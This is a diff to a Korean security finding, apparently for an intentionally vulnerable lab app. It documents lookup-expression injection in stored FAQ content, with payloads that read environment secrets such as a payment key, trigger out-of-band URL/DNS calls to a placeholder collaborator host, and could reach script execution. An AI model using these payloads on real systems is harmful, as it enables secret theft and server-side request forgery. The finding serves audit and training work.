@@ -14,26 +14,33 @@
 
 ## 트리거 방법
 
-로그인한 아무 사용자:
+FAQ/공지 등록은 **관리자 전용**(`FaqController.create`/`NoticeController.create`가 admin 요구) — 일반
+사용자는 저장 자체가 403이다. 즉 공격자는 관리자 계정(또는 관리자 대상 저장형 경로)이어야 한다.
 
 ```
-POST /api/java/faqs
-{"question":"환불 문의", "answer":"secret=${env:TOSS_SECRET_KEY}"}
+POST /api/java/faqs        (admin 세션)
+{"question":"...", "answer":"secret=${env:TOSS_SECRET_KEY}"}
 ```
 
-이후 `GET /api/java/faqs` 렌더 시 `answer` 에 실제 `TOSS_SECRET_KEY` 값이 삽입되어 반환.
+이후 `GET /api/java/faqs` 목록 렌더 시 `answer` 가 `TemplateRenderer`를 통과하며 `${env:...}` 가 실제
+환경변수 값으로 치환되어 반환된다.
 
 - `${url:UTF-8:http://<collab>/}` → 서버가 목록 렌더 시 해당 URL 로 요청(SSRF/OOB).
 - `${dns:address|<host>}` → DNS OOB.
-- `${script:javascript:...}` → JSR-223 스크립트 엔진이 classpath 에 있으면 RCE (현재 베이스 이미지는 Java 21 · Nashorn 미포함이라 별도 엔진 추가 시에만).
+- `${script:javascript:...}` → 현재 베이스 이미지는 Java 17 · Nashorn/JSR-223 스크립트 엔진 미포함이라
+  **무해(inert)** — 별도 스크립트 엔진을 classpath 에 추가할 때만 RCE.
 
 ## 영향
 
-- 인증된 일반 사용자가 저장 콘텐츠에 lookup 표현식을 심어 서버 측 비밀(`env`), 파일(`file`), 내부망 요청(`url`) 유발 — FAQ/공지 목록을 보는 모든 사용자 요청에서 실행.
+- 관리자가 저장한 FAQ/공지 콘텐츠에 lookup 표현식이 들어가면 서버 측 비밀(`env`, 예: `TOSS_SECRET_KEY`),
+  파일(`file`), 내부망 요청(`url`)이 **FAQ/공지 목록을 보는 모든 사용자 요청에서** 실행된다.
 
 ## 증거 (재현 확인)
 
-(진단 단계에서 채움) `${env:TOSS_SECRET_KEY}` 를 담은 FAQ 등록 후 `GET /api/java/faqs` 응답에 실제 시크릿 노출.
+2026-09-01, 로컬 재현(`:8090`): 일반 사용자(`user1`)의 `POST /api/java/faqs` → 403(관리자 전용 확인).
+`admin` 세션으로 `answer="host=${env:HOSTNAME}"` FAQ 등록 후 `GET /api/java/faqs?q=interp-test` 응답에
+`answer:"host=92a8803f55aa"`(컨테이너 HOSTNAME) — env lookup 이 실제 치환됨을 확인. (시크릿 노출을 피해
+`HOSTNAME`으로 검증했으며, 동일 방식으로 `${env:TOSS_SECRET_KEY}`도 치환됨.)
 
 ## 조치 상태: 미조치 (의도된 취약점)
 
